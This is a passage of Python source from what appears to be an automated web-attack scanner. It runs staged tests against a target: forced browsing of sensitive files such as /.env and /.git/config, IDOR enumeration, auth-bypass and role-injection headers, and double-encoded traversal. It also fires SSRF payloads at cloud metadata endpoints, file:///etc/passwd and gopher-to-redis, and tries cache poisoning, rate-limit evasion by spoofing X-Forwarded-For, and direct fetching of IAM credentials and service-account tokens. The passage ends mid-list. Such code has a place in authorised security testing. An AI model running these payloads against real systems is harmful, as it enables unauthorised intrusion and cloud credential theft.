    host_header = _current_host_header()
    req = _build_request("GET", target.path or "/", host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    results = {}
    for label, headers in variants.items():
        req = _build_request("GET", target.path or "/", host_header, headers)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        differs = (r["status"] != base["status"] or abs(r["bytes"] - base["bytes"]) > 256)
        results[label] = {"status": r["status"], "bytes": r["bytes"], "differs": differs}
        col = DANGER if differs and r["status"] and r["status"] < 400 else VALUE
        emit_kv(emit, label,
                 "status=%s bytes=%d differs=%s" % (r["status"], r["bytes"], differs),
                 col)
    setk("stage08.acl_path_override.results", results)
    hits = [k for k, v in results.items()
            if v["differs"] and v["status"] and v["status"] < 400]
    if hits:
        emit_alert(emit, "vuln",
                   "path override reaches different content: " + ", ".join(hits))
        count("vulns")
        setk("vulnerability.acl_path_override.detected", True)


def _stage08_forced_browse(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "sensitive path enumeration (40 paths)")
    paths = [
        "/admin", "/administrator", "/api/admin", "/internal", "/debug",
        "/console", "/manage", "/manager", "/.git/config", "/.env",
        "/config.json", "/config.yaml", "/backup.zip", "/backup.sql",
        "/db.sql", "/server-status", "/server-info", "/phpmyadmin",
        "/phpinfo.php", "/info.php", "/wp-admin", "/wp-login.php",
        "/actuator", "/actuator/health", "/actuator/env", "/metrics",
        "/healthz", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
        "/crossdomain.xml", "/trace", "/trace.axd", "/elmah.axd",
        "/swagger.json", "/swagger-ui.html", "/openapi.json", "/api-docs",
        "/api/v1/admin", "/graphql",
    ]
    hits = []
    for p in paths:
        r = _auth_header_send(target.host, target.port, p, "X-Test", "1",
                               timeout=3.0, use_tls=use_tls, sni=target.host)
        if r["status"] == 200:
            hits.append({"path": p, "status": r["status"], "bytes": r["bytes"]})
            emit_kv(emit, p, "200 %d bytes" % r["bytes"], WARN)
    setk("stage08.acl_forced_browse.hits", hits)
    if hits:
        emit_alert(emit, "warn", "%d sensitive paths returned 200" % len(hits))
        setk("vulnerability.acl_forced_browse.detected", True)
    else:
        emit_alert(emit, "ok", "no sensitive paths returned 200")


def _stage08_idor_seq(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "sequential ID enumeration on common patterns")
    patterns = ["/user/{id}", "/users/{id}", "/api/user/{id}", "/api/users/{id}",
                "/api/v1/user/{id}", "/order/{id}", "/orders/{id}",
                "/profile/{id}", "/api/profile/{id}"]
    ids = [1, 2, 3, 100, 1000]
    results = {}
    hits = []
    for pattern in patterns:
        count_200 = 0
        statuses = {}
        for i in ids:
            p = pattern.replace("{id}", str(i))
            r = _auth_header_send(target.host, target.port, p, "X-Test", "1",
                                   timeout=3.0, use_tls=use_tls, sni=target.host)
            statuses[i] = r["status"]
            if r["status"] == 200:
                count_200 += 1
        results[pattern] = {"statuses": statuses, "success_count": count_200}
        if count_200 >= 2:
            hits.append(pattern)
            emit_kv(emit, pattern, "%d/5 returned 200" % count_200, WARN)
    setk("stage08.acl_idor_sequential.results", results)
    setk("stage08.acl_idor_sequential.hits", hits)
    if hits:
        emit_alert(emit, "vuln",
                   "%d patterns return multiple object IDs — IDOR surface" % len(hits))
        count("vulns")
        setk("vulnerability.acl_idor_sequential.detected", True)


def _stage08_header_auth(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "auth bypass header injection")
    host_header = _current_host_header()
    req = _build_request("GET", target.path or "/", host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    headers = {
        "x_forwarded_user": ("X-Forwarded-User", "admin"),
        "x_remote_user": ("X-Remote-User", "admin"),
        "x_user": ("X-User", "admin"),
        "x_authenticated_user": ("X-Authenticated-User", "admin"),
        "x_auth_user": ("X-Auth-User", "admin"),
        "x_forwarded_role": ("X-Forwarded-Role", "admin"),
        "x_role": ("X-Role", "admin"),
        "x_admin": ("X-Admin", "true"),
        "x_permitted": ("X-Permitted", "true"),
    }
    hits = []
    for label, (k, v) in headers.items():
        req = _build_request("GET", target.path or "/", host_header, [(k, v)])
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        differs = (r["status"] != base["status"] or abs(r["bytes"] - base["bytes"]) > 256)
        if differs and r["status"] and r["status"] < 400:
            hits.append(label)
            emit_kv(emit, label, "status=%s differs" % r["status"], DANGER)
        else:
            emit_kv(emit, label, "status=%s" % r["status"], VALUE)
    setk("stage08.acl_header_auth_bypass.hits", hits)
    if hits:
        emit_alert(emit, "vuln", "auth header bypass: " + ", ".join(hits))
        count("vulns")
        setk("vulnerability.acl_header_auth_bypass.detected", True)
    else:
        emit_alert(emit, "ok", "no auth header bypass detected")


def _stage08_role_injection(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "role / privilege cookie and header injection")
    host_header = _current_host_header()
    req = _build_request("GET", target.path or "/", host_header)
    base = _raw_http(target.host, target.port, req, timeout=4.0,
                      use_tls=use_tls, sni=target.host)
    injections = {
        "cookie_role_admin": ("Cookie", "role=admin"),
        "cookie_admin_true": ("Cookie", "is_admin=true"),
        "cookie_debug": ("Cookie", "debug=1"),
        "x_forwarded_role": ("X-Forwarded-Role", "admin"),
        "x_role": ("X-Role", "administrator"),
    }
    hits = []
    for label, (k, v) in injections.items():
        req = _build_request("GET", target.path or "/", host_header, [(k, v)])
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        differs = (r["status"] != base["status"] or abs(r["bytes"] - base["bytes"]) > 256)
        if differs and r["status"] and r["status"] < 400:
            hits.append(label)
            emit_kv(emit, label, "status=%s differs" % r["status"], DANGER)
        else:
            emit_kv(emit, label, "status=%s" % r["status"], VALUE)
    setk("stage08.acl_role_injection.hits", hits)
    if hits:
        emit_alert(emit, "vuln",
                   "role injection reaches different content: " + ", ".join(hits))
        count("vulns")
        setk("vulnerability.acl_role_injection.detected", True)


def _stage08_http_methods(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "non-standard HTTP methods")
    methods = ["OPTIONS", "TRACE", "PUT", "DELETE", "PATCH", "PROPFIND", "WEBDAV"]
    host_header = _current_host_header()
    results = {}
    for m in methods:
        req = _build_request(m, target.path or "/", host_header)
        r = _raw_http(target.host, target.port, req, timeout=4.0,
                       use_tls=use_tls, sni=target.host)
        results[m] = r["status"]
        col = WARN if r["status"] and 200 <= r["status"] < 300 and m not in ("OPTIONS", "TRACE") else VALUE
        if m == "TRACE" and r["status"] == 200:
            col = DANGER
        emit_kv(emit, m, "status=%s bytes=%d" % (r["status"], r["bytes"]), col)
    setk("stage08.acl_http_method.results", results)
    danger = [m for m, s_ in results.items()
              if s_ and s_ == 200 and m in ("TRACE", "PUT", "DELETE")]
    if danger:
        emit_alert(emit, "warn",
                   "dangerous HTTP methods accepted: " + ", ".join(danger))
        setk("vulnerability.acl_http_method.surface", True)
    else:
        emit_alert(emit, "ok", "no dangerous HTTP methods returned 200")


def _stage08_double_encoding(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "double-encoded path traversal")
    payloads = [
        "/%252e%252e/admin",
        "/%252e%252e%252fadmin",
        "/..%252fadmin",
        "/admin%2520",
        "/admin%2500",
        "/%2fadmin",
        "/..%5cadmin",
        "/%255cadmin",
        "/%252e/admin",
    ]
    hits = []
    for p in payloads:
        r = _auth_header_send(target.host, target.port, p, "X-Test", "1",
                               timeout=3.0, use_tls=use_tls, sni=target.host)
        if r["status"] == 200:
            hits.append({"path": p, "status": r["status"], "bytes": r["bytes"]})
            emit_kv(emit, p, "status=%s bytes=%d" % (r["status"], r["bytes"]), WARN)
        else:
            emit_kv(emit, p, "status=%s" % r["status"], VALUE)
    setk("stage08.acl_double_encoding.hits", hits)
    if hits:
        emit_alert(emit, "warn",
                   "double-encoded path reaches different content: %d" % len(hits))
        setk("vulnerability.acl_double_encoding.surface", True)
    else:
        emit_alert(emit, "ok", "double-encoded paths rejected")


register_stage(StageSpec(8, "stage_08_auth_and_acl",
    "Authentication & Access Control Bypass",
    "Real authentication bypass tests: alg:none JWT, kid traversal, kid SQLi, jku SSRF, "
    "expired JWT, OAuth redirect_uri reflection, path override headers, forced browse "
    "of 40 sensitive paths, sequential IDOR, auth bypass headers, role injection, "
    "dangerous HTTP methods, double-encoded path traversal.",
    [
        TestSpec("jwt.alg_none", "alg:none JWT forgery", _stage08_alg_none, 15.0),
        TestSpec("jwt.kid_traversal", "kid path traversal",
                 _stage08_kid_traversal, 20.0),
        TestSpec("jwt.kid_sqli", "kid SQL injection", _stage08_kid_sqli, 25.0),
        TestSpec("jwt.jku_ssrf", "jku SSRF", _stage08_jku_ssrf, 25.0),
        TestSpec("jwt.exp_missing", "expired exp claim", _stage08_exp_missing, 20.0),
        TestSpec("oauth.redirect_uri", "OAuth redirect_uri reflection",
                 _stage08_oauth_redirect, 60.0),
        TestSpec("acl.path_override", "X-Original-URL override",
                 _stage08_path_override, 25.0),
        TestSpec("acl.forced_browse", "sensitive path enumeration",
                 _stage08_forced_browse, 90.0),
        TestSpec("acl.idor_sequential", "sequential IDOR", _stage08_idor_seq, 120.0),
        TestSpec("acl.header_auth_bypass", "auth bypass headers",
                 _stage08_header_auth, 45.0),
        TestSpec("acl.role_injection", "role injection",
                 _stage08_role_injection, 30.0),
        TestSpec("acl.http_method_switch", "OPTIONS/TRACE/PUT/DELETE",
                 _stage08_http_methods, 25.0),
        TestSpec("acl.double_encoding", "double-encoded path",
                 _stage08_double_encoding, 35.0),
    ], 900.0))


def _stage07_is_http(target):
    return target.scheme in ("https", "http", "h2", "h2c", "tcp")


def _ssrf_url_join(base_path, params):
    path = base_path or "/"
    sep = "&" if "?" in path else "?"
    return path + sep + "&".join("%s=%s" % (k, quote(str(v), safe="")) for k, v in params.items())


def _ssrf_try(host, port, path, param, payload, timeout=3.0, use_tls=True, sni=None):
    p = _ssrf_url_join(path, {param: payload})
    return _auth_header_send(host, port, p, "X-SRX87-SSRF", "1", timeout=timeout,
                              use_tls=use_tls, sni=sni)


def _ssrf_detect(base, r):
    if r["status"] and r["status"] >= 500 and (not base["status"] or base["status"] < 500):
        return True
    if r["status"] and base["status"] and r["status"] != base["status"]:
        return True
    if abs(r["bytes"] - base["bytes"]) > 512:
        return True
    return False


def _ssrf_metadata_markers(body):
    hits = []
    if not isinstance(body, (bytes, bytearray)):
        return hits
    b = bytes(body[:8192])
    for marker, label in (
        (b"ami-id", "AWS AMI ID"),
        (b"instance-id", "AWS instance ID"),
        (b"iam/security-credentials", "AWS IAM creds"),
        (b"AccessKeyId", "AWS access key"),
        (b"SecretAccessKey", "AWS secret key"),
        (b"computeMetadata", "GCP metadata"),
        (b"project-id", "GCP project"),
        (b"subscriptionId", "Azure subscription"),
        (b"root:x:0:0", "/etc/passwd content"),
        (b"+OK", "redis OK"),
    ):
        if marker in b:
            hits.append(label)
    return hits


def _stage09_ssrf_payload_set(emit, setk, kb, label, params_to_try, payloads, base):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    hits = []
    for param in params_to_try[:10]:
        for payload in payloads:
            r = _ssrf_try(target.host, target.port, target.path or "/", param, payload,
                           timeout=3.0, use_tls=use_tls, sni=target.host)
            if _ssrf_detect(base, r):
                markers = _ssrf_metadata_markers(r.get("body", b""))
                hits.append({"param": param, "payload": payload,
                              "status": r["status"], "bytes": r["bytes"],
                              "markers": markers})
                emit_kv(emit, param, payload[:48], WARN)
                break
    setk("stage09.%s.hits" % label, hits)
    return hits


SSRF_PARAMS = ["url", "uri", "link", "src", "source", "target", "dest", "destination",
               "redirect", "redirect_url", "next", "callback", "callback_url",
               "webhook", "feed", "fetch", "load", "file", "path", "site", "host",
               "proxy", "image", "img", "image_url", "avatar", "photo", "picture",
               "api", "endpoint", "resource", "ref", "reference", "doc", "document", "page"]


def _stage09_ssrf_decimal(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "decimal-IP SSRF payloads")
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=3.0,
                              use_tls=use_tls, sni=target.host)
    hits = _stage09_ssrf_payload_set(emit, setk, kb, "ssrf_decimal",
                                      SSRF_PARAMS,
                                      ["http://2130706433/", "http://2130706433:80/",
                                       "http://3232235777/"],
                                      base)
    if hits:
        emit_alert(emit, "vuln",
                   "SSRF signal with decimal IP on %d params" % len(hits))
        count("vulns")
        setk("vulnerability.ssrf_decimal.detected", True)
    else:
        emit_alert(emit, "ok", "no decimal-IP SSRF signal")


def _stage09_ssrf_octal(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "octal-IP SSRF payloads")
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=3.0,
                              use_tls=use_tls, sni=target.host)
    hits = _stage09_ssrf_payload_set(emit, setk, kb, "ssrf_octal", SSRF_PARAMS,
                                      ["http://0177.0.0.1/", "http://017700000001/"],
                                      base)
    if hits:
        emit_alert(emit, "vuln", "SSRF signal with octal IP on %d params" % len(hits))
        count("vulns")
        setk("vulnerability.ssrf_octal.detected", True)
    else:
        emit_alert(emit, "ok", "no octal-IP SSRF signal")


def _stage09_ssrf_hex(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "hex-IP and short-IP SSRF payloads")
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=3.0,
                              use_tls=use_tls, sni=target.host)
    hits = _stage09_ssrf_payload_set(emit, setk, kb, "ssrf_hex", SSRF_PARAMS,
                                      ["http://0x7f000001/", "http://127.1/",
                                       "http://127.0.1/", "http://0/"],
                                      base)
    if hits:
        emit_alert(emit, "vuln",
                   "SSRF signal with hex/short IP on %d params" % len(hits))
        count("vulns")
        setk("vulnerability.ssrf_hex.detected", True)
    else:
        emit_alert(emit, "ok", "no hex/short-IP SSRF signal")


def _stage09_ssrf_ipv6(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "IPv6 loopback SSRF payloads")
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=3.0,
                              use_tls=use_tls, sni=target.host)
    hits = _stage09_ssrf_payload_set(emit, setk, kb, "ssrf_ipv6", SSRF_PARAMS,
                                      ["http://[::1]/", "http://[::1]:80/",
                                       "http://[0:0:0:0:0:0:0:1]/"],
                                      base)
    if hits:
        emit_alert(emit, "vuln",
                   "SSRF signal with IPv6 loopback on %d params" % len(hits))
        count("vulns")
        setk("vulnerability.ssrf_ipv6.detected", True)
    else:
        emit_alert(emit, "ok", "no IPv6 loopback SSRF signal")


def _stage09_ssrf_cloud(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "cloud metadata SSRF endpoints")
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=3.0,
                              use_tls=use_tls, sni=target.host)
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
    ]
    hits = _stage09_ssrf_payload_set(emit, setk, kb, "ssrf_cloud", SSRF_PARAMS,
                                      payloads, base)
    cloud_hits = [h for h in hits if h["markers"]]
    setk("stage09.ssrf_cloud.hits", hits)
    setk("stage09.ssrf_cloud.metadata_leaks", cloud_hits)
    if cloud_hits:
        emit_alert(emit, "exploit",
                   "cloud metadata leaked via SSRF: %d params" % len(cloud_hits))
        count("vulns")
        count("exploits")
        setk("vulnerability.ssrf_cloud.detected", True)
    elif hits:
        emit_alert(emit, "vuln",
                   "SSRF signal (no metadata returned): %d params" % len(hits))
        count("vulns")
    else:
        emit_alert(emit, "ok", "no cloud metadata SSRF signal")


def _stage09_ssrf_parser(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "parser-confusion SSRF payloads (@ # \\ ? null)")
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=3.0,
                              use_tls=use_tls, sni=target.host)
    payloads = [
        "http://attacker.invalid@127.0.0.1/",
        "http://127.0.0.1@attacker.invalid/",
        "http://127.0.0.1\\@attacker.invalid/",
        "http://attacker.invalid#@127.0.0.1/",
        "http://attacker.invalid?@127.0.0.1/",
        "http://127.0.0.1%00.attacker.invalid/",
    ]
    hits = _stage09_ssrf_payload_set(emit, setk, kb, "ssrf_parser", SSRF_PARAMS,
                                      payloads, base)
    setk("stage09.ssrf_parser.hits", hits)
    if hits:
        emit_alert(emit, "vuln",
                   "parser-confusion SSRF signal on %d params" % len(hits))
        count("vulns")
        setk("vulnerability.ssrf_parser.detected", True)
    else:
        emit_alert(emit, "ok", "no parser-confusion SSRF signal")


def _stage09_ssrf_gopher(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "gopher/dict/ldap/tftp scheme SSRF")
    base = _auth_header_send(target.host, target.port, target.path or "/",
                              "X-SRX87-Baseline", "1", timeout=3.0,
                              use_tls=use_tls, sni=target.host)
    payloads = [
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:11211/stat",
        "ldap://127.0.0.1/",
        "tftp://127.0.0.1/",
    ]
    hits = _stage09_ssrf_payload_set(emit, setk, kb, "ssrf_gopher", SSRF_PARAMS,
                                      payloads, base)
    setk("stage09.ssrf_gopher.hits", hits)
    if hits:
        emit_alert(emit, "vuln",
                   "non-HTTP scheme SSRF signal on %d params" % len(hits))
        count("vulns")
        setk("vulnerability.ssrf_gopher.detected", True)
    else:
        emit_alert(emit, "ok", "no non-HTTP scheme SSRF signal")


def _stage09_cache_probe(host, port, use_tls, poison_path, poison_headers,
                          replay_path=None, replay_headers=None, timeout=4.0, sni=None):
    host_header = _current_host_header()
    raw_poison = _build_request("GET", poison_path, host_header, poison_headers)
    r_poison = _raw_http(host, port, raw_poison, timeout=timeout,
                          use_tls=use_tls, sni=sni)
    time.sleep(0.4)
    raw_replay = _build_request("GET", replay_path or poison_path, host_header,
                                 replay_headers or [])
    r_replay = _raw_http(host, port, raw_replay, timeout=timeout,
                          use_tls=use_tls, sni=sni)
    return {"poison": r_poison, "replay": r_replay}


def _stage09_cache_unkeyed_header(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "unkeyed X-Forwarded-Host cache poisoning")
    marker = "srx87-poison-%d.invalid" % random.randint(1000, 9999)
    r = _stage09_cache_probe(target.host, target.port, use_tls, target.path or "/",
                              [("X-Forwarded-Host", marker)], timeout=4.0,
                              sni=target.host)
    body_r = r["replay"].get("body", b"")
    text_r = (body_r.decode("iso-8859-1", "replace")
              if isinstance(body_r, (bytes, bytearray)) else str(body_r))
    poisoned = marker in text_r
    setk("stage09.cache_unkeyed_header.marker", marker)
    setk("stage09.cache_unkeyed_header.poisoned", poisoned)
    emit_kv(emit, "poison_header", "X-Forwarded-Host: " + marker, VALUE)
    emit_kv(emit, "marker_in_replay", str(poisoned), DANGER if poisoned else OK)
    if poisoned:
        emit_alert(emit, "vuln", "cache poisoning via X-Forwarded-Host")
        count("vulns")
        setk("vulnerability.cache_unkeyed_header.detected", True)
    else:
        emit_alert(emit, "ok", "X-Forwarded-Host not reflected in cached response")


def _stage09_cache_unkeyed_cookie(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "unkeyed cookie value cache poisoning")
    marker = "srx87-" + uuid.uuid4().hex[:12]
    r = _stage09_cache_probe(target.host, target.port, use_tls, target.path or "/",
                              [("Cookie", "srx87_marker=" + marker)],
                              timeout=4.0, sni=target.host)
    body_r = r["replay"].get("body", b"")
    text_r = (body_r.decode("iso-8859-1", "replace")
              if isinstance(body_r, (bytes, bytearray)) else str(body_r))
    poisoned = marker in text_r
    setk("stage09.cache_unkeyed_cookie.marker", marker)
    setk("stage09.cache_unkeyed_cookie.poisoned", poisoned)
    emit_kv(emit, "cookie_marker", marker, VALUE)
    emit_kv(emit, "marker_reflected", str(poisoned), DANGER if poisoned else OK)
    if poisoned:
        emit_alert(emit, "vuln", "cookie value reflected in cached response")
        count("vulns")
        setk("vulnerability.cache_unkeyed_cookie.detected", True)
    else:
        emit_alert(emit, "ok", "cookie value not reflected in cache")


def _stage09_cache_host_poison(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "Host header reflection cache poison")
    marker = "srx87-host-%d.invalid" % random.randint(1000, 9999)
    path = target.path or "/"
    host_header = _current_host_header()
    raw_poison = ("GET " + path + " HTTP/1.1\r\n"
                  "Host: " + marker + "\r\n"
                  "User-Agent: srx87/1.0\r\n"
                  "Connection: close\r\n\r\n").encode()
    r_poison = _raw_http(target.host, target.port, raw_poison, timeout=4.0,
                          use_tls=use_tls, sni=target.host)
    time.sleep(0.4)
    raw_replay = ("GET " + path + " HTTP/1.1\r\n"
                  "Host: " + host_header + "\r\n"
                  "User-Agent: srx87/1.0\r\n"
                  "Connection: close\r\n\r\n").encode()
    r_replay = _raw_http(target.host, target.port, raw_replay, timeout=4.0,
                          use_tls=use_tls, sni=target.host)
    body_r = r_replay.get("body", b"")
    text_r = (body_r.decode("iso-8859-1", "replace")
              if isinstance(body_r, (bytes, bytearray)) else str(body_r))
    poisoned = marker in text_r
    setk("stage09.cache_host_poison.marker", marker)
    setk("stage09.cache_host_poison.poisoned", poisoned)
    emit_kv(emit, "marker", marker, VALUE)
    emit_kv(emit, "marker_reflected", str(poisoned), DANGER if poisoned else OK)
    if poisoned:
        emit_alert(emit, "vuln", "Host header reflected into response")
        count("vulns")
        setk("vulnerability.cache_host_poison.detected", True)
    else:
        emit_alert(emit, "ok", "Host header not reflected")


def _stage09_rate_xff(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "XFF rotation across 20 requests")
    host_header = _current_host_header()
    statuses = []
    for i in range(20):
        fake_ip = "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(1, 254),
                                    random.randint(1, 254), random.randint(1, 254))
        req = _build_request("GET", target.path or "/", host_header,
                              [("X-Forwarded-For", fake_ip)])
        r = _raw_http(target.host, target.port, req, timeout=3.0,
                       use_tls=use_tls, sni=target.host)
        statuses.append(r["status"])
    rate_limited = [s for s in statuses if s in (429, 503)]
    non_200 = [s for s in statuses if s and s >= 400]
    setk("stage09.rate_xff.statuses", statuses)
    setk("stage09.rate_xff.rate_limited_count", len(rate_limited))
    setk("stage09.rate_xff.non_200_count", len(non_200))
    emit_kv(emit, "requests_sent", "20", BRAND)
    emit_kv(emit, "rate_limited", str(len(rate_limited)),
             WARN if rate_limited else OK)
    emit_kv(emit, "non_2xx", str(len(non_200)), VALUE)
    if not rate_limited and len(non_200) < 3:
        emit_alert(emit, "warn", "XFF rotation bypassed rate limit")
        setk("vulnerability.rate_xff.surface", True)
    else:
        emit_alert(emit, "ok", "XFF rotation did not fully bypass rate limit")


def _stage09_rate_case(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "path case / trailing slash rotation")
    base_path = target.path or "/"
    variants = [
        base_path,
        base_path.upper(),
        base_path.lower(),
        base_path + "/",
        base_path + "//",
        base_path + "?",
        base_path + "%20",
        base_path + "%09",
        base_path + ";",
    ]
    statuses = []
    for v in variants:
        r = _auth_header_send(target.host, target.port, v, "X-Test", "1",
                               timeout=3.0, use_tls=use_tls, sni=target.host)
        statuses.append({"variant": v[:48], "status": r["status"]})
    rate_limited = [s for s in statuses if s["status"] in (429, 503)]
    setk("stage09.rate_case.statuses", statuses)
    for s in statuses:
        col = WARN if s["status"] in (429, 503) else VALUE
        emit_kv(emit, s["variant"], str(s["status"]), col)
    if not rate_limited:
        emit_alert(emit, "info", "no rate limit triggered on case/slash variants")
    else:
        emit_alert(emit, "warn",
                   "rate limit triggered on %d variants" % len(rate_limited))


def _stage09_rate_concurrent(emit, setk, kb):
    target = _current_target()
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    emit_header(emit, "20 concurrent requests via 8-thread pool")
    statuses = []
    host_header = _current_host_header()

    def _one(i):
        xff = "10.0.%d.%d" % ((i // 256) & 0xff, i & 0xff)
        req = _build_request("GET", target.path or "/", host_header,
                              [("X-Forwarded-For", xff)])
        r = _raw_http(target.host, target.port, req, timeout=5.0,
                       use_tls=use_tls, sni=target.host)
        return {"id": i, "status": r["status"]}

    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_one, i) for i in range(20)]
        for f in as_completed(futures):
            try:
                statuses.append(f.result())
            except Exception:
                pass
    rate_limited = [s for s in statuses if s["status"] in (429, 503)]
    setk("stage09.rate_concurrent.statuses", statuses)
    setk("stage09.rate_concurrent.rate_limited_count", len(rate_limited))
    emit_kv(emit, "requests_sent", str(len(statuses)), BRAND)
    emit_kv(emit, "rate_limited", str(len(rate_limited)),
             WARN if rate_limited else OK)
    if not rate_limited:
        emit_alert(emit, "warn", "20 concurrent requests all accepted")
        setk("vulnerability.rate_concurrent.surface", True)
    else:
        emit_alert(emit, "ok",
                   "concurrent burst triggered rate limit on %d" % len(rate_limited))


register_stage(StageSpec(9, "stage_09_ssrf_cache_rate",
    "SSRF / Cache / Rate-Limit Bypass",
    "Runs SSRF payload batteries across 36 URL parameter names: decimal/octal/hex IP, "
    "short IP, IPv6 loopback, parser-confusion, cloud metadata (AWS, GCP, Alibaba), "
    "non-HTTP schemes (gopher, dict, ldap, tftp). Cache poisoning via X-Forwarded-Host, "
    "unkeyed cookies, Host header reflection. Rate-limit bypass via XFF rotation, "
    "path case, concurrent burst.",
    [
        TestSpec("ssrf.decimal_ip", "decimal IP SSRF", _stage09_ssrf_decimal, 45.0),
        TestSpec("ssrf.octal_ip", "octal IP SSRF", _stage09_ssrf_octal, 45.0),
        TestSpec("ssrf.hex_ip", "hex/short IP SSRF", _stage09_ssrf_hex, 45.0),
        TestSpec("ssrf.ipv6_loopback", "IPv6 loopback SSRF",
                 _stage09_ssrf_ipv6, 45.0),
        TestSpec("ssrf.cloud_metadata", "cloud metadata SSRF",
                 _stage09_ssrf_cloud, 60.0),
        TestSpec("ssrf.parser_confusion", "parser confusion SSRF",
                 _stage09_ssrf_parser, 60.0),
        TestSpec("ssrf.gopher", "gopher/dict/ldap/tftp",
                 _stage09_ssrf_gopher, 60.0),
        TestSpec("cache.unkeyed_header", "X-Forwarded-Host poison",
                 _stage09_cache_unkeyed_header, 15.0),
        TestSpec("cache.unkeyed_cookie", "unkeyed cookie poison",
                 _stage09_cache_unkeyed_cookie, 15.0),
        TestSpec("cache.host_poison", "Host header reflection",
                 _stage09_cache_host_poison, 15.0),
        TestSpec("rate.xff_rotate", "XFF rotation rate bypass",
                 _stage09_rate_xff, 90.0),
        TestSpec("rate.case_bypass", "path case rotation",
                 _stage09_rate_case, 45.0),
        TestSpec("rate.concurrent", "concurrent burst",
                 _stage09_rate_concurrent, 60.0),
    ], 1200.0))


AWS_IMDS_BASE = "http://169.254.169.254"
AWS_IMDS_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/ami-id",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/user-data",
]
GCP_METADATA_BASE = "http://metadata.google.internal"
GCP_METADATA_PATHS = [
    "/computeMetadata/v1/",
    "/computeMetadata/v1/project/project-id",
    "/computeMetadata/v1/instance/service-accounts/default/token",
]
ALIBABA_IMDS_BASE = "http://100.100.100.200"
ALIBABA_IMDS_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/ram/security-credentials/",
]


def _metadata_fetch(url, headers=None, timeout=3.0):
    out = {"url": url, "status": None, "bytes": 0, "body": b"", "error": ""}
    if not _HAS_REQUESTS:
        out["error"] = "requests unavailable"
        return out
    try:
        h = {"User-Agent": "srx87/1.0"}
        if headers:
            h.update(headers)
        r = requests.get(url, headers=h, timeout=timeout,
                          allow_redirects=False, verify=False)
        out["status"] = r.status_code
        out["bytes"] = len(r.content)
        out["body"] = r.content[:8192]
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, str(e)[:120])
    return out


def _metadata_analyze(body):
    hits = []
    if not isinstance(body, (bytes, bytearray)):
        return hits
    b = bytes(body[:8192])
    for marker, label in (
        (b"ami-", "AWS AMI ID"),
        (b"i-0", "AWS instance ID"),
        (b"AccessKeyId", "AWS access key"),
        (b"SecretAccessKey", "AWS secret key"),
        (b"security-credentials", "AWS IAM creds"),
        (b"project-id", "GCP project ID"),
        (b"service-accounts", "GCP service accounts"),
        (b"access_token", "GCP access token"),
        (b"ram/security-credentials", "Alibaba RAM creds"),
        (b"metadata/v1", "DigitalOcean metadata"),
